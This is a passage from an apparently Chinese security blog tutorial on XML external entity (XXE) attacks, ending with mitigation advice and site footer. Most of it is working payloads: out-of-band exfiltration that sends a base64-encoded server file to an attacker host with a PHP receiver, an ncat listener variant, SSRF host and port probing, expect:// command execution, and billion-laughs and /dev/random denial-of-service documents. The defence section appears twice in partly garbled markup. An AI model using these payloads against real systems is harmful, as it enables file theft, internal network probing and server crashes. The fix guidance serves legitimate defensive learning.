<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    
&lt;!ENTITY % remote SYSTEM "http://192.168.220.128/test.dtd"&gt;
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"&gt;
%remote;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>在自己的服务器上搭建test.dtd</p> 
<pre><code class="prism language-xml-dtd">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://192.168.220.128/test.php?file=%file;'&gt;"&gt;%all;
</code></pre> 
<p>test.php</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> 
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>访问时，存在漏洞的服务器会读出<code>c:/windows/win.ini</code>内容并且进行base64编码，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</p> 
<p><img src="https://images2.imgbox.com/7a/41/MVNrNdp6_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/4e/fc/YaOOT6gI_o.png" alt="在这里插入图片描述"></p> 
<p><strong>方法二：</strong></p> 
<p>思路就是在没有回显的时候，我们将读取的文件带出来，举一个例子就是，我们如果将/etc/passwd文件赋给实体test，那么我们在访问<code>http://192.168.220.128?%test</code>时，如果有报错信息可以查看报错信息有没有，还可以查看我们服务器上的日志文件，日志文件会保存/etc/passwd的文件内容</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    
&lt;!ENTITY % remote SYSTEM "http://192.168.220.128/evil.dtd"&gt;
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"&gt;
%remote;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>evil.dtd的内容，内部的%号要进行实体编码成<code>&amp;#x25</code>,因为在evil.dtd的实体中不能有%。</p> 
<pre><code class="prism language-xml-dtd">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://192.168.220.128/?%file;'&gt;"&gt;%all;

//&lt;!ENTITY % all ”&lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> send SYSTEM ‘http://192.168.220.128/?%file;’&gt;“&gt;%all;
</code></pre> 
<p><img src="https://images2.imgbox.com/da/eb/199RGV97_o.png" alt="在这里插入图片描述"></p> 
<p><strong>方法三：</strong></p> 
<p>使用ncat监听一个端口：</p> 
<p><img src="https://images2.imgbox.com/85/d2/b6MYaa1s_o.png" alt="在这里插入图片描述"></p> 
<p>也可以用python创建一个建议的http服务。</p> 
<p><code>python -m SimpleHTTPServer 端口 </code></p> 
<p>然后，我们构造payload：</p> 
<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE message [    
&lt;!ENTITY remote SYSTEM "http://192.168.220.128/evil.dtd"&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;remote;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre> 
<p>evil.dtd</p> 
<pre><code>&lt;!ENTITY remote SYSTEM "http://开启监听的IP地址:监听端口/%file"&gt;
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"&gt;
</code></pre> 
<p>然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串，有时候也会出现报错的情况（这是我们在漏洞的代码中没有屏蔽错误和警告），比如我们这里的payload没有选用php的base64编码，这里报错了，但是同时也将所读取的内容爆了出来，只是特殊字符经过了HTML实体编码。</p> 
<h5><a id="43_658"></a>4.3、内网探测</h5> 
<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version = "1.0"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY f SYSTEM "http://192.168.1.1/"&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h5><a id="44_670"></a>4.4、端口探测</h5> 
<p>正因为xml外部实体攻击利用的http协议，也就是说利用该请求探测内网端口的存活，从而可以进行ssrf攻击。构造代码：</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY xxes SYSTEM "http://127.0.0.1:8000"&gt; 
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxes;">&amp;xxes;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h5><a id="45_682"></a>4.5、命令执行</h5> 
<p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY xxes SYSTEM "expect://ipconfig"&gt; 
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxes;">&amp;xxes;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h5><a id="46DOS_694"></a>4.6、DOS攻击</h5> 
<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lolz</span> <span class="token punctuation">[</span><span class="token internal-subset">
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol</span> <span class="token attr-name">"lol"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”abc”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p> 
<p>如果目标是UNIX系统，</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">&gt;</span></span>
  &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p> 
<h3><a id="XXE_728"></a>三、XXE漏洞修复与防御</h3> 
<p>xxe漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p> 
<p>方案一：使用开发语言提供的禁用外部实体的方法</p> 
<pre><code>PHP
libxml_disable_entity_loader(true);

JAVA
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</code></pre> 
<p>方案二：过滤用户提交的XML数据</p> 
<p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br> " &gt;]&gt;<br> &amp;xxe;</p> 
<pre><code>
如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。

## 三、XXE漏洞修复与防御

xxe漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type  definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。

方案一：使用开发语言提供的禁用外部实体的方法

</code></pre> 
<p>PHP<br> libxml_disable_entity_loader(true);</p> 
<p>JAVA<br> DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br> dbf.setExpandEntityReferences(false);</p> 
<p>Python<br> from lxml import etree<br> xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p> 
<pre><code>
方案二：过滤用户提交的XML数据

过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。

</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/735c74f99c371e8431ae15e39f05258b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Product Quantization算法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/bd13107b845ad7b4378002a8347747cb/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">浏览器存储indexDB介绍</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>